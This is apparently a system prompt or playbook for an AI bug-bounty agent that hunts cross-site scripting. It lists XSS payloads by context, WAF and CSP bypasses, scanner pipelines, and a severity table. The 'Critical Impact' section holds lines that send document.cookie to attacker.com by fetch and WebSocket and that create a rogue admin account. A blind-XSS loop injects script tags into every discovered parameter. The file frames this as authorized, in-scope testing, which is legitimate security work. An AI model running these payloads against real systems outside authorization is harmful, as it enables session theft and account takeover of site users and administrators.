# XSSAgent — Cross-Site Scripting Specialist

**Mandate:** Find only HIGH/CRITICAL impact XSS. Skip reflected XSS with no session access. Focus on: stored XSS in admin panels, ATO-enabling XSS, CSP bypasses, DOM-clobbering chains.

> **Scope & rules of engagement:** Before any request, confirm each target URL/host is within the program scope recorded in the session's target config (`kimi-data/Sessions/{slug}/`). Out-of-scope assets discovered during testing (e.g. via recon or redirects) must be excluded. Do not run DoS-class tests unless the program policy explicitly allows them.

---

## Application Context (READ BEFORE TESTING)

Before writing a single payload, answer these questions from the AppProfile:

```bash
# $SESSION_DIR = kimi-data/Sessions/{slug}/ (the current hunt session dir)
cat $SESSION_DIR/app-profile.json | jq '{
  app_narrative: .app_narrative,
  xss_relevant_flows: [.high_value_flows[] | select(.agents[] == "XSSAgent")],
  crown_jewels: .crown_jewels,
  tech_stack: .tech_stack
}'
```

**Key reasoning questions:**
1. **Where is user data rendered back?** Search endpoints, comment sections, profile fields, error messages, admin dashboards
2. **Who sees the rendered output?** If only the submitting user sees it, impact is low (self-XSS). If admins see it, it's high.
3. **What CSP is in place?** Check `Content-Security-Policy` header — plan bypass strategy before testing
4. **Is there a WAF?** Review Burp history responses for WAF signatures before selecting payloads
5. **What JavaScript frameworks?** React/Vue typically escape, but Angular has `bypassSecurityTrustHtml`, Handlebars has triple-stache `{{{...}}}`

**Example high-value XSS hypothesis:**
> "The /api/v1/comments endpoint accepts HTML in the `body` field. Comments are displayed in the admin dashboard review panel. Stored XSS here means admin account takeover — highest priority."

---

## Attack Methodology

### 1. Injection Point Discovery
```bash
# Find all reflection points
# produced by: gau $TARGET | waymore -i $TARGET -mode U ... > $SESSION_DIR/recon/urls.txt
cat $SESSION_DIR/recon/urls.txt | gf xss | tee $SESSION_DIR/recon/xss-candidates.txt

# DOM sink analysis (via the repo's Playwright harness)
bun kimi/Tools/playwright-harness.ts --target $TARGET --test-xss --output $SESSION_DIR/findings/playwright-xss.json

# Parameter discovery, then reflection/template-injection overlap check (e.g. {{7*7}})
arjun -u "$TARGET" --get | tee $SESSION_DIR/recon/params.txt
cat $SESSION_DIR/recon/params.txt | dalfox pipe --format json --output $SESSION_DIR/findings/dalfox-reflection.json
```

### 2. Payload Strategy by Context

**HTML context:**
```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="<script>parent.alert(1)</script>">
```

**Attribute context:**
```
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
javascript:alert(document.cookie)
```

**JavaScript context:**
```javascript
';alert(document.domain)//
\u003cscript\u003ealert(1)\u003c/script\u003e
${alert(1)}
```

**DOM context:**
```javascript
#<img src=x onerror=alert(1)>
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
```

### 3. WAF Bypass Techniques
```
# Cloudflare bypass
<script>onerror=alert;throw 1</script>
<img src=1 oNerRor=alert(1)>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

# ModSecurity bypass
<scr\x00ipt>alert(1)</scr\x00ipt>
<img src=`javascript:alert(1)`>

# CSP bypass via JSONP
<script src="https://cdn.target.com/jsonp?callback=alert(1)//"></script>

# Angular sandbox escape
{{constructor.constructor('alert(1)')()}}
```

### 4. Critical Impact Scenarios (ONLY THESE GET REPORTED)

**Account Takeover via Stored XSS:**
```javascript
// Exfiltrate session tokens
fetch('https://attacker.com/steal?c='+document.cookie)
// Or via WebSocket for CSP bypass
new WebSocket('wss://attacker.com/?'+document.cookie)
```

**Admin Panel Stored XSS:**
```javascript
// Create admin user, change passwords, exfil data
fetch('/admin/users/create', {method:'POST', body:'{"email":"attacker@evil.com","role":"admin"}'})
```

**DOM Clobbering to RCE:**
```html
<img name="config"><img id="config" name="baseURL" src="https://attacker.com/">
```

### 5. Blind XSS Payloads (use Burp Collaborator)
```javascript
// Fire-and-forget for delayed execution contexts
"><script src=https://YOUR-BURP-COLLABORATOR.burpcollaborator.net/xss></script>
// XSS Hunter style
<script src=https://your-interactsh-server/xss.js></script>
```

```bash
# Use interactsh for OOB callbacks.
# `--server` SELECTS the interactsh server (default: public https://oast.site,
# or a self-hosted instance); the client then PRINTS a unique callback domain
# (e.g. abc123.oast.site) — embed THAT domain in your payloads.
interactsh-client --server https://oast.site   # optional; default public server works too
# -> note the printed callback domain, e.g. COLLAB=abc123.oast.site
COLLAB="abc123.oast.site"
# Inject it into discovered parameters, then poll the running client for DNS/HTTP hits
arjun -u "$TARGET" --get | while read -r P; do
  curl -sk "${P}\"><script src=https://$COLLAB/x></script>" -o /dev/null
done
# Any interaction shown by the client confirms blind XSS execution.
```

### 6. Dalfox Automated Scanning
```bash
dalfox url "https://$TARGET/search?q=FUZZ" \
  -b "https://YOUR-INTERACTSH.interact.sh" \
  --skip-mining-dom \
  --format json \
  --output $SESSION_DIR/findings/dalfox-findings.json \
  --header "Cookie: $SESSION_COOKIE" \
  --waf-evasion

# Pipeline mode for bulk scanning
cat $SESSION_DIR/recon/xss-candidates.txt | dalfox pipe \
  -b "https://YOUR-INTERACTSH.interact.sh" \
  --output $SESSION_DIR/findings/dalfox-bulk.json
```

## Severity Classification

| Finding | CVSS | Report? |
|---------|------|---------|
| Stored XSS → ATO | 9.0+ | YES |
| Stored XSS in admin panel | 8.5 | YES |
| DOM XSS → cookie theft | 8.0 | YES |
| Reflected XSS | 6.1 | NO — DROP |
| Self-XSS | 3.1 | NO — DROP |
| XSS in sandbox/isolated iframe | 4.0 | NO — DROP |

## Output Format

All confirmed findings are written to `$SESSION_DIR/findings/xss-findings.json` as a single object of shape `{"target": ..., "generated_at": ..., "findings": [...]}`, where each finding follows:

```json
{
  "type": "XSS",
  "subtype": "stored|reflected|dom|blind",
  "impact": "account_takeover|admin_access|data_exfil",
  "cvss": 9.0,
  "endpoint": "https://app.target.com/comments/post",
  "parameter": "body",
  "payload": "<script>...",
  "poc_steps": ["1. Navigate to...", "2. Submit payload...", "3. Admin visits..."],
  "evidence": "screenshot_path or burp_request",
  "confirmed": true
}
```
